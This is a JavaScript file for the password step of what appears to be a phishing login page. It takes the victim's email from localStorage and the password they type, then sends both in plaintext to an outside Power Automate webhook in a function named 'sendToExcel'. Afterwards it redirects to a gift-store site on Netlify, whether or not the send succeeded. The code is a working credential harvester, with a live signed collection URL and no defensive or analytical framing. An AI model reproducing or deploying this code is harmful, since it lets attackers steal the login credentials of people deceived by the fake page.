// Display the user's email when the page loads
window.addEventListener('load', function() {
    const userEmail = localStorage.getItem('userEmail');
    if (userEmail) {
        document.getElementById('user_email').textContent = userEmail;
    } else {
        // If no email is found, redirect back to the login page
        window.location.href = 'index.html';
    }
});

// Function to toggle password visibility
function togglePassword() {
    const passwordInput = document.getElementById('password_input');
    const checkbox = document.getElementById('show_pass_checkbox');
    
    if (checkbox.checked) {
        passwordInput.type = 'text';
    } else {
        passwordInput.type = 'password';
    }
}

// Function to send data to Power Automate
async function sendToExcel(email, password) {
    try {
        const powerAutomateUrl = 'https://prod-30.centralindia.logic.azure.com:443/workflows/eeebaaeffe884837993b50cc0ae4856a/triggers/manual/paths/invoke?api-version=2016-06-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=JqzTO83dFGRU7fU80iay9xQd2EOm9deBYn7dldwtPPw';
        
        const response = await fetch(powerAutomateUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            })
        });

        if (!response.ok) {
            throw new Error('Failed to store data');
        }

        // Data successfully stored
        console.log('Data stored successfully');
        
        // Redirect to the specified URL after successful data storage
        window.location.href = 'https://caratlane-gift-store.netlify.app/';
        
    } catch (error) {
        console.error('Error storing data:', error);
        
        window.location.href = 'https://caratlane-gift-store.netlify.app/';
    }
}

// Add event listener for the Next button
document.getElementById('next_button').addEventListener('click', async function(e) {
    e.preventDefault();
    const email = localStorage.getItem('userEmail');
    const password = document.getElementById('password_input').value;
    
    if (password.length === 0) {
        alert('Please enter your password');
        return;
    }

    // Send data to Power Automate
    await sendToExcel(email, password);
});

// Add event listener for Enter key
document.getElementById('password_input').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        document.getElementById('next_button').click();
    }
});
